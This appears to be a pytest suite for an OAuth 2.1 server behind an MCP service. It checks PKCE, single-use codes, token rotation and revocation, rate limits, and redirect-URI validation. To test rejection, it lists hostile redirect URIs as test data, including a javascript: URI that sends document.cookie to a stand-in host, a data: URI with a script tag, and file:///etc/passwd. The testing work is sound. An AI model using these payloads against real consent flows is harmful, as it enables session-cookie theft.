"""The OAuth 2.1 authorization-server flow.

Drives register → authorize → approve → token → refresh → revoke against the
real routes and provider, with the consent screen's browser step replaced by a
direct service call (the page itself is NiceGUI and covered by the UI loop).

The security-relevant assertions here are the ones about *reuse*: a code that
works twice, a refresh token that survives rotation, or an MCP token accepted by
the REST API each turn a single leak into standing access.
"""

import base64
import hashlib
import secrets
from datetime import datetime, timezone

import pytest

from application.api_scopes import ApiScope
from application.services import McpAuthService
from application.services.api_token_service import MCP_TOKEN_PREFIX
from models import User
from tests.api_helpers import build_api_app, client_for
from tests.mcp.conftest import auth, mcp_session, rpc


def pkce() -> tuple[str, str]:
    verifier = secrets.token_urlsafe(48)
    digest = hashlib.sha256(verifier.encode()).digest()
    challenge = base64.urlsafe_b64encode(digest).decode().rstrip('=')
    return verifier, challenge


async def register(client, redirect_uri='http://localhost:9999/callback') -> str:
    resp = await register_raw(client, redirect_uri, auth_method='none')
    return resp['client_id']


_OMIT = object()


async def register_raw(client, redirect_uri, auth_method=_OMIT) -> dict:
    body = {
        'client_name': 'Test Client',
        'redirect_uris': [redirect_uri],
        'grant_types': ['authorization_code', 'refresh_token'],
        'response_types': ['code'],
    }
    if auth_method is not _OMIT:
        body['token_endpoint_auth_method'] = auth_method
    resp = await client.post('/register', json=body)
    assert resp.status_code in (200, 201), resp.text
    return resp.json()


async def authorize_and_approve(client, client_id, challenge, user, redirect_uri, state='xyz'):
    """Run /authorize, then approve as the signed-in user would."""
    resp = await client.get('/authorize', params={
        'client_id': client_id,
        'redirect_uri': redirect_uri,
        'response_type': 'code',
        'code_challenge': challenge,
        'code_challenge_method': 'S256',
        'state': state,
    })
    assert resp.status_code in (302, 307), resp.text
    location = resp.headers['location']
    assert '/oauth/mcp/consent' in location, location
    txn = location.split('txn=')[1].split('&')[0]
    code, _, returned_state = await McpAuthService().approve(txn, user, scopes={ApiScope.SCHEDULE_READ})
    assert returned_state == state
    return code


async def exchange(client, client_id, code, verifier, redirect_uri):
    return await client.post('/token', data={
        'grant_type': 'authorization_code',
        'client_id': client_id,
        'code': code,
        'code_verifier': verifier,
        'redirect_uri': redirect_uri,
    })


class TestDiscoveryMetadata:
    async def test_authorization_server_metadata(self, db):
        async with mcp_session() as client:
            resp = await client.get('/.well-known/oauth-authorization-server')
        assert resp.status_code == 200
        body = resp.json()
        for key in ('issuer', 'authorization_endpoint', 'token_endpoint',
                    'registration_endpoint'):
            assert body.get(key), key
        assert 'S256' in body['code_challenge_methods_supported']


class TestFullFlow:
    async def test_register_authorize_exchange_and_call(self, db):
        """The whole grant, ending in a real authenticated tool call."""
        user = await User.create(discord_id=555001, username='oauth-user')
        redirect_uri = 'http://localhost:9999/callback'
        verifier, challenge = pkce()
        async with mcp_session() as client:
            client_id = await register(client, redirect_uri)
            code = await authorize_and_approve(
                client, client_id, challenge, user, redirect_uri
            )
            resp = await exchange(client, client_id, code, verifier, redirect_uri)
            assert resp.status_code == 200, resp.text
            body = resp.json()
            assert body['token_type'].lower() == 'bearer'
            assert body['access_token'].startswith(MCP_TOKEN_PREFIX)
            assert body['refresh_token']
            assert body['expires_in'] > 0

            call = await rpc(client, body['access_token'], 'tools/list')
            assert call.status_code == 200

    async def test_authorization_code_is_single_use(self, db):
        user = await User.create(discord_id=555002, username='oauth-replay')
        redirect_uri = 'http://localhost:9999/callback'
        verifier, challenge = pkce()
        async with mcp_session() as client:
            client_id = await register(client, redirect_uri)
            code = await authorize_and_approve(
                client, client_id, challenge, user, redirect_uri
            )
            first = await exchange(client, client_id, code, verifier, redirect_uri)
            assert first.status_code == 200
            replay = await exchange(client, client_id, code, verifier, redirect_uri)
        assert replay.status_code == 400
        assert replay.json()['error'] == 'invalid_grant'

    async def test_wrong_pkce_verifier_is_rejected(self, db):
        """Without this, a stolen code alone would be enough."""
        user = await User.create(discord_id=555003, username='oauth-pkce')
        redirect_uri = 'http://localhost:9999/callback'
        _, challenge = pkce()
        other_verifier, _ = pkce()
        async with mcp_session() as client:
            client_id = await register(client, redirect_uri)
            code = await authorize_and_approve(
                client, client_id, challenge, user, redirect_uri
            )
            resp = await exchange(client, client_id, code, other_verifier, redirect_uri)
        assert resp.status_code == 400
        assert resp.json()['error'] == 'invalid_grant'

    async def test_refresh_rotates_both_halves(self, db):
        """A refresh must invalidate the refresh token it consumed.

        Otherwise a leaked refresh token grants indefinite parallel access that
        nothing ever surfaces.
        """
        user = await User.create(discord_id=555004, username='oauth-refresh')
        redirect_uri = 'http://localhost:9999/callback'
        verifier, challenge = pkce()
        async with mcp_session() as client:
            client_id = await register(client, redirect_uri)
            code = await authorize_and_approve(
                client, client_id, challenge, user, redirect_uri
            )
            first = (await exchange(client, client_id, code, verifier, redirect_uri)).json()

            refreshed = await client.post('/token', data={
                'grant_type': 'refresh_token',
                'client_id': client_id,
                'refresh_token': first['refresh_token'],
            })
            assert refreshed.status_code == 200, refreshed.text
            second = refreshed.json()
            assert second['access_token'] != first['access_token']
            assert second['refresh_token'] != first['refresh_token']

            replay = await client.post('/token', data={
                'grant_type': 'refresh_token',
                'client_id': client_id,
                'refresh_token': first['refresh_token'],
            })
            assert replay.status_code == 400

            stale = await rpc(client, first['access_token'], 'tools/list')
            assert stale.status_code == 401
            fresh = await rpc(client, second['access_token'], 'tools/list')
            assert fresh.status_code == 200

    async def test_revocation_stops_access(self, db):
        user = await User.create(discord_id=555005, username='oauth-revoke')
        redirect_uri = 'http://localhost:9999/callback'
        verifier, challenge = pkce()
        async with mcp_session() as client:
            client_id = await register(client, redirect_uri)
            code = await authorize_and_approve(
                client, client_id, challenge, user, redirect_uri
            )
            tokens = (await exchange(client, client_id, code, verifier, redirect_uri)).json()
            assert (await rpc(client, tokens['access_token'], 'tools/list')).status_code == 200

            # client_secret must be present (empty) even for a public client: pydantic requires the key.
            revoke = await client.post('/revoke', data={
                'client_id': client_id,
                'client_secret': '',
                'token': tokens['access_token'],
            })
            assert revoke.status_code == 200, revoke.text
            after = await rpc(client, tokens['access_token'], 'tools/list')
        assert after.status_code == 401

    async def test_unknown_redirect_uri_is_refused(self, db):
        """An attacker-chosen redirect must never reach a consent screen."""
        async with mcp_session() as client:
            client_id = await register(client, 'http://localhost:9999/callback')
            _, challenge = pkce()
            resp = await client.get('/authorize', params={
                'client_id': client_id,
                'redirect_uri': 'http://evil.example.com/steal',
                'response_type': 'code',
                'code_challenge': challenge,
                'code_challenge_method': 'S256',
            })
        assert resp.status_code == 400
        assert 'evil.example.com' not in resp.headers.get('location', '')


class TestRedirectUriRules:
    """The consent page navigates the signed-in browser to the redirect URI from
    the app's own origin, so a ``javascript:`` one ran as whoever clicked
    Approve or Deny."""

    @pytest.mark.parametrize('uri', [
        "javascript:fetch('//e.example/'+document.cookie)//",
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox(1)',
        'file:///etc/passwd',
        'http://evil.example.com/callback',
        'https://client.example/cb#frag',
    ])
    async def test_unsafe_redirect_uri_is_refused_at_registration(self, db, uri):
        async with mcp_session() as client:
            resp = await client.post('/register', json={
                'client_name': 'Bad', 'redirect_uris': [uri],
                'grant_types': ['authorization_code'], 'response_types': ['code'],
                'token_endpoint_auth_method': 'none',
            })
        assert resp.status_code == 400, resp.text
        assert resp.json()['error'] == 'invalid_redirect_uri'

    @pytest.mark.parametrize('uri', [
        'https://claude.ai/api/mcp/auth_callback',
        'http://localhost:33418/callback',
        'http://127.0.0.1:5173/cb',
        'http://[::1]:8080/cb',
        'cursor://anysphere.cursor-retrieval/oauth/callback',
    ])
    async def test_real_clients_still_register(self, db, uri):
        async with mcp_session() as client:
            assert await register(client, uri)

    async def test_a_stored_unsafe_uri_is_never_approved(self, db):
        """A client registered before the rule existed."""
        user = await User.create(discord_id=555090, username='oauth-old-client')
        service = McpAuthService()
        await service.repository.create_client(
            client_id='legacy', client_name='Legacy', redirect_uris=['javascript:alert(1)//'],
            grant_types=['authorization_code'], response_types=['code'],
            token_endpoint_auth_method='none', scope='mcp',
        )
        from application.services.mcp_auth_service import PendingAuthorization
        txn = service.begin_authorization(PendingAuthorization(
            client_id='legacy', redirect_uri='javascript:alert(1)//',
            redirect_uri_provided_explicitly=True, code_challenge='x', state=None,
            scopes=['mcp'], resource=None, created_at=datetime.now(timezone.utc),
        ))
        with pytest.raises(ValueError):
            await service.approve(txn, user, scopes={ApiScope.SCHEDULE_READ})


class TestSecretBasedRegistration:
    """Clients that register asking for a client secret still connect.

    Claude's connectors register with ``client_secret_post``, and the SDK
    defaults a registration that names no method to the same. mcp 2.x refuses
    a secret-based client with no stored secret, and we store none (clients are
    public; PKCE binds the code), so every such client got a 401 at ``/token``.
    """

    @pytest.mark.parametrize('auth_method', ['client_secret_post', 'client_secret_basic', _OMIT])
    async def test_exchange_and_refresh_succeed(self, db, auth_method):
        user = await User.create(discord_id=555095, username='oauth-secret-client')
        redirect_uri = 'https://claude.ai/api/mcp/auth_callback'
        verifier, challenge = pkce()
        async with mcp_session() as client:
            reg = await register_raw(client, redirect_uri, auth_method)
            client_id, secret = reg['client_id'], reg.get('client_secret')
            code = await authorize_and_approve(client, client_id, challenge, user, redirect_uri)
            headers = {}
            if auth_method == 'client_secret_basic':
                creds = base64.b64encode(f'{client_id}:{secret}'.encode()).decode()
                headers['Authorization'] = f'Basic {creds}'
            resp = await client.post('/token', headers=headers, data={
                'grant_type': 'authorization_code',
                'client_id': client_id,
                'client_secret': secret,
                'code': code,
                'code_verifier': verifier,
                'redirect_uri': redirect_uri,
            })
            assert resp.status_code == 200, resp.text
            refreshed = await client.post('/token', headers=headers, data={
                'grant_type': 'refresh_token',
                'client_id': client_id,
                'client_secret': secret,
                'refresh_token': resp.json()['refresh_token'],
            })
            assert refreshed.status_code == 200, refreshed.text

    async def test_client_stored_as_secret_based_still_exchanges(self, db):
        """A row registered before the fix carries ``client_secret_post``."""
        user = await User.create(discord_id=555096, username='oauth-legacy-secret')
        redirect_uri = 'https://claude.ai/api/mcp/auth_callback'
        await McpAuthService().repository.create_client(
            client_id='legacy-post', client_name='Legacy', redirect_uris=[redirect_uri],
            grant_types=['authorization_code', 'refresh_token'], response_types=['code'],
            token_endpoint_auth_method='client_secret_post', scope='wizzrobe:read',
        )
        verifier, challenge = pkce()
        async with mcp_session() as client:
            code = await authorize_and_approve(client, 'legacy-post', challenge, user, redirect_uri)
            resp = await exchange(client, 'legacy-post', code, verifier, redirect_uri)
        assert resp.status_code == 200, resp.text


class TestConcurrentExchange:
    """Check-then-set let two simultaneous requests both spend one code."""

    async def test_one_code_mints_one_token_pair(self, db):
        user = await User.create(discord_id=555091, username='oauth-race')
        redirect_uri = 'http://localhost:9999/callback'
        _, challenge = pkce()
        service = McpAuthService()
        async with mcp_session() as client:
            client_id = await register(client, redirect_uri)
            raw = await authorize_and_approve(client, client_id, challenge, user, redirect_uri)
        first = await service.load_code(client_id, raw)
        second = await service.load_code(client_id, raw)
        await service.exchange_code(first)
        with pytest.raises(ValueError, match='already been used'):
            await service.exchange_code(second)

    async def test_one_refresh_token_rotates_once(self, db):
        user = await User.create(discord_id=555092, username='oauth-refresh-race')
        redirect_uri = 'http://localhost:9999/callback'
        verifier, challenge = pkce()
        service = McpAuthService()
        async with mcp_session() as client:
            client_id = await register(client, redirect_uri)
            code = await authorize_and_approve(client, client_id, challenge, user, redirect_uri)
            body = (await exchange(client, client_id, code, verifier, redirect_uri)).json()
        first = await service.load_refresh_token(client_id, body['refresh_token'])
        second = await service.load_refresh_token(client_id, body['refresh_token'])
        await service.exchange_refresh(first)
        with pytest.raises(ValueError, match='already been used'):
            await service.exchange_refresh(second)


class TestSurfaceSeparation:
    async def test_oauth_token_is_refused_by_the_rest_api(self, db):
        """A credential minted for /mcp must not be replayable against /api."""
        user = await User.create(discord_id=555006, username='oauth-rest')
        redirect_uri = 'http://localhost:9999/callback'
        verifier, challenge = pkce()
        async with mcp_session() as client:
            client_id = await register(client, redirect_uri)
            code = await authorize_and_approve(
                client, client_id, challenge, user, redirect_uri
            )
            tokens = (await exchange(client, client_id, code, verifier, redirect_uri)).json()

        api_app = build_api_app()
        async with client_for(api_app, tokens['access_token']) as api:
            resp = await api.get('/api/tournaments')
        assert resp.status_code == 401


class TestConsentPage:
    async def test_expired_transaction_cannot_be_approved(self, db):
        """A consent link that outlived its request must mint nothing."""
        user = await User.create(discord_id=555007, username='oauth-expired')
        service = McpAuthService()
        try:
            await service.approve('not-a-real-transaction', user, scopes={ApiScope.SCHEDULE_READ})
        except Exception as exc:
            assert 'expired' in str(exc).lower()
        else:
            raise AssertionError('approve() accepted an unknown transaction')

    async def test_approval_is_single_use(self, db):
        """Re-submitting the consent form must not mint a second code."""
        user = await User.create(discord_id=555008, username='oauth-double')
        redirect_uri = 'http://localhost:9999/callback'
        _, challenge = pkce()
        async with mcp_session() as client:
            client_id = await register(client, redirect_uri)
            resp = await client.get('/authorize', params={
                'client_id': client_id,
                'redirect_uri': redirect_uri,
                'response_type': 'code',
                'code_challenge': challenge,
                'code_challenge_method': 'S256',
            })
            txn = resp.headers['location'].split('txn=')[1].split('&')[0]
            service = McpAuthService()
            await service.approve(txn, user, scopes={ApiScope.SCHEDULE_READ})
            try:
                await service.approve(txn, user, scopes={ApiScope.SCHEDULE_READ})
            except Exception as exc:
                assert 'expired' in str(exc).lower()
            else:
                raise AssertionError('approve() ran twice for one request')


class TestRoleIndependence:
    async def test_grant_does_not_confer_roles(self, db):
        """Connecting a client must not widen what the user can see.

        The token acts as the user; a user with no roles gets a working
        connection and an empty world, not an error and not extra reach.
        """
        user = await User.create(discord_id=555009, username='oauth-noroles')
        assert not await user.roles.all()
        redirect_uri = 'http://localhost:9999/callback'
        verifier, challenge = pkce()
        async with mcp_session() as client:
            client_id = await register(client, redirect_uri)
            code = await authorize_and_approve(
                client, client_id, challenge, user, redirect_uri
            )
            tokens = (await exchange(client, client_id, code, verifier, redirect_uri)).json()
            resp = await client.post(
                '/mcp', headers=auth(tokens['access_token']),
                json={'jsonrpc': '2.0', 'id': 1, 'method': 'tools/call',
                      'params': {'name': 'list_tenants', 'arguments': {}}},
            )
        assert resp.status_code == 200
        result = resp.json()['result']
        assert not result.get('isError'), result
        assert result['structuredContent']['result'] == []


class TestUnauthenticatedRouteLimits:
    """The authorization-server routes are the app's only unauthenticated writes.

    They hang off the outer app, so neither the ``/api`` router's limiter nor the
    ``/mcp`` endpoint's covers them — and ``/register`` inserts a row per call.
    Without a limit anyone can grow ``mcp_oauth_clients`` as fast as they can POST.
    """

    async def test_register_is_rate_limited(self, db, monkeypatch):
        monkeypatch.setenv('API_RATE_LIMIT_PER_MIN', '3')
        async with mcp_session() as client:
            codes = []
            for index in range(5):
                resp = await client.post('/register', json={
                    'client_name': f'flood-{index}',
                    'redirect_uris': ['http://localhost:9999/callback'],
                    'grant_types': ['authorization_code'],
                    'response_types': ['code'],
                    'token_endpoint_auth_method': 'none',
                })
                codes.append(resp.status_code)
        assert 429 in codes, codes
        assert codes[0] != 429, codes

    async def test_token_endpoint_is_rate_limited(self, db, monkeypatch):
        """A bad-code guess is cheap; guessing it unboundedly should not be."""
        monkeypatch.setenv('API_RATE_LIMIT_PER_MIN', '2')
        async with mcp_session() as client:
            codes = []
            for _ in range(4):
                resp = await client.post('/token', data={
                    'grant_type': 'authorization_code',
                    'client_id': 'nobody',
                    'code': 'guess',
                    'code_verifier': 'x' * 43,
                    'redirect_uri': 'http://localhost:9999/callback',
                })
                codes.append(resp.status_code)
        assert 429 in codes, codes

    async def test_cors_preflight_is_never_limited(self, db, monkeypatch):
        """A 429 on a preflight breaks a browser client for a reason it can't report."""
        monkeypatch.setenv('API_RATE_LIMIT_PER_MIN', '1')
        async with mcp_session() as client:
            for _ in range(4):
                resp = await client.options('/register', headers={
                    'Origin': 'https://inspector.example',
                    'Access-Control-Request-Method': 'POST',
                })
                assert resp.status_code != 429, resp.status_code
